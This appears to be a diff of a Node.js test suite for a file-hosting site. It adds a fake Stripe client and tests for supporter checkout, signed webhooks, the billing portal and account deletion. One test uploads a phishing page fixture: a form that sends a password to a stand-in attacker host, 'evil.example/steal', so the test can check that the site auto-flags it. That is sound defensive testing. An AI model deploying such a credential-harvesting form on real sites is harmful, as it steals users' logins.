@@ -23,11 +23,22 @@ delete process.env.TURNSTILE_SECRET_KEY;
 // Stripe's API is never called: Checkout and the billing portal answer from here, and webhooks are signed for real
 const Stripe = require('stripe');
 const stripeCalls = [];
+// what the fake Stripe holds: open checkouts and subscriptions per customer; fail makes every call throw
+const fake = { customers: 0, open: [], subs: [], cancelled: [], fail: false };
+const listed = (data) => Object.assign(Promise.resolve({ data }), { [Symbol.asyncIterator]: async function* () { yield* data; } });
+const stripeCall = (fn) => (...a) => { if (fake.fail) throw new Error('Stripe is down'); stripeCalls.push(a[0]); return fn(...a); };
 require.cache[require.resolve('stripe')].exports = function FakeStripe(key) {
   const s = new Stripe(key);
-  const session = (url) => ({ sessions: { create: async (p) => { stripeCalls.push(p); return { url }; } } });
-  s.checkout = session('https://checkout.stripe.com/c/pay/test');
-  s.billingPortal = session('https://billing.stripe.com/p/session/test');
+  s.customers = { create: stripeCall(async () => ({ id: `cus_test${++fake.customers}` })) };
+  s.checkout = { sessions: {
+    create: stripeCall(async () => ({ url: 'https://checkout.stripe.com/c/pay/test' })),
+    list: stripeCall(({ customer }) => listed(fake.open.filter((o) => o.customer === customer))),
+  } };
+  s.subscriptions = {
+    list: stripeCall(({ customer }) => listed(fake.subs.filter((o) => o.customer === customer))),
+    cancel: stripeCall(async (id) => { fake.cancelled.push(id); return { id, status: 'canceled' }; }),
+  };
+  s.billingPortal = { sessions: { create: stripeCall(async () => ({ url: 'https://billing.stripe.com/p/session/test' })) } };
   return s;
 };
 
@@ -2303,7 +2314,9 @@ test('supporters get bigger limits and any file type; when support lapses nothin
   db.prepare('UPDATE users SET supporter_until = ? WHERE username = ?').run(Date.now() + 86400000, 'bigdog');
   assert.match((await upload(m, 'tool.exe', 'MZ')).text, /Uploaded 1 file/);
   assert.match((await upload(m, 'big.png', big)).text, /Uploaded 1 file/);
-  assert.match((await req('get', '/dashboard').set('Cookie', m.cookie)).text, /of 3 MB/);
+  const dash = (await req('get', '/dashboard').set('Cookie', m.cookie)).text;
+  assert.match(dash, /of 3 MB/);
+  assert.match(dash, /data-max="2097152"/); // the drag-and-drop uploader checks sizes against the supporter limit too
   // a supporter's rarer page types are still checked for phishing
   await upload(m, 'login.xhtml', '<form action="https://evil.example/steal"><input type="password" name="pw"> verify your account</form>');
   assert.match(db.prepare("SELECT details FROM reports WHERE site = 'bigdog' AND reason = 'Auto-flag'").get().details, /^login\.xhtml:/);
@@ -2341,17 +2354,28 @@ test('supporting through Stripe: checkout, webhook, flair, billing portal and la
   assert.equal(go.status, 303);
   assert.equal(go.headers.location, 'https://checkout.stripe.com/c/pay/test');
   const call = stripeCalls.at(-1);
+  const cus = row().stripe_customer_id;
+  assert.match(cus, /^cus_test/); // made before checkout, so every try finds the same customer
   assert.equal(call.client_reference_id, String(row().id));
-  assert.equal(call.customer_email, 'goodboy@example.com');
+  assert.equal(call.customer, cus);
   assert.deepEqual(call.line_items, [{ price: 'price_test', quantity: 1 }]);
+  // a second try before paying reopens the same checkout instead of starting a second subscription
+  fake.open.push({ customer: cus, url: 'https://checkout.stripe.com/c/pay/open' });
+  const again = await req('post', '/dashboard/support').set('Cookie', m.cookie).type('form').send({ _csrf: m.csrf });
+  assert.equal(again.headers.location, 'https://checkout.stripe.com/c/pay/open');
+  fake.open = [];
+  // paid, but the webhook hasn't arrived: no second checkout either
+  fake.subs.push({ id: 'sub_1', customer: cus, status: 'active' });
+  assert.equal((await req('post', '/dashboard/support').set('Cookie', m.cookie).type('form').send({ _csrf: m.csrf })).status, 409);
 
   // forged or unsigned webhooks change nothing
-  assert.equal((await hook('checkout.session.completed', { customer: 'cus_1', client_reference_id: String(row().id) }, 'whsec_wrong')).status, 400);
-  assert.equal(row().stripe_customer_id, '');
-  assert.equal((await hook('checkout.session.completed', { customer: 'cus_1', client_reference_id: String(row().id) })).status, 200);
-  assert.equal(row().stripe_customer_id, 'cus_1');
+  const before = row().supporter_until;
+  assert.equal((await hook('customer.subscription.created', { customer: cus, status: 'active', metadata: {}, items: { data: [{ current_period_end: 2e9 }] } }, 'whsec_wrong')).status, 400);
+  assert.equal(row().supporter_until, before);
+  assert.equal((await hook('checkout.session.completed', { customer: cus, client_reference_id: String(row().id) })).status, 200);
+  assert.equal(row().stripe_customer_id, cus);
   const end = Math.floor(Date.now() / 1000) + 30 * 86400;
-  await hook('customer.subscription.created', { customer: 'cus_1', status: 'active', metadata: {}, items: { data: [{ current_period_end: end }] } });
+  await hook('customer.subscription.created', { customer: cus, status: 'active', metadata: {}, items: { data: [{ current_period_end: end }] } });
   assert.ok(row().supporter_until > end * 1000);
 
   // flair wherever the name shows, and the count on the home page
@@ -2364,10 +2388,10 @@ test('supporting through Stripe: checkout, webhook, flair, billing portal and la
   assert.equal((await req('post', '/dashboard/support').set('Cookie', m.cookie).type('form').send({ _csrf: m.csrf })).status, 409);
   const portal = await req('post', '/dashboard/support/portal').set('Cookie', m.cookie).type('form').send({ _csrf: m.csrf });
   assert.equal(portal.headers.location, 'https://billing.stripe.com/p/session/test');
-  assert.equal(stripeCalls.at(-1).customer, 'cus_1');
+  assert.equal(stripeCalls.at(-1).customer, cus);
 
   // cancelled: the perks and the flair stop at once
-  await hook('customer.subscription.deleted', { customer: 'cus_1', status: 'canceled', metadata: {}, items: { data: [{ current_period_end: end }] } });
+  await hook('customer.subscription.deleted', { customer: cus, status: 'canceled', metadata: {}, items: { data: [{ current_period_end: end }] } });
   assert.ok(row().supporter_until <= Date.now());
   assert.doesNotMatch((await req('get', '/site/goodboy')).text, /alt="PuppyPad supporter"/);
   assert.match((await req('get', '/dashboard/support').set('Cookie', m.cookie)).text, /Your support ended/);
@@ -2376,6 +2400,16 @@ test('supporting through Stripe: checkout, webhook, flair, billing portal and la
   const pupId = db.prepare('SELECT id FROM users WHERE username = ?').get('latepup').id;
   await hook('customer.subscription.created', { customer: 'cus_2', status: 'active', metadata: { user_id: String(pupId) }, items: { data: [{ current_period_end: end }] } });
   assert.ok(db.prepare('SELECT supporter_until FROM users WHERE id = ?').get(pupId).supporter_until > Date.now());
+
+  // deleting the login cancels its subscription first, and keeps the account if Stripe can't be reached
+  const del = () => req('post', '/dashboard/delete-account').set('Cookie', m.cookie).type('form').send({ _csrf: m.csrf, password: 'longpassword1' });
+  fake.fail = true;
+  assert.equal((await del()).status, 502);
+  assert.ok(row());
+  fake.fail = false;
+  assert.equal((await del()).status, 200);
+  assert.deepEqual(fake.cancelled, ['sub_1']);
+  assert.equal(row(), undefined);
 
   // the terms and the privacy page say what supporting means and who takes the money
   assert.match((await req('get', '/rules')).text, /id="supporter-terms"/);
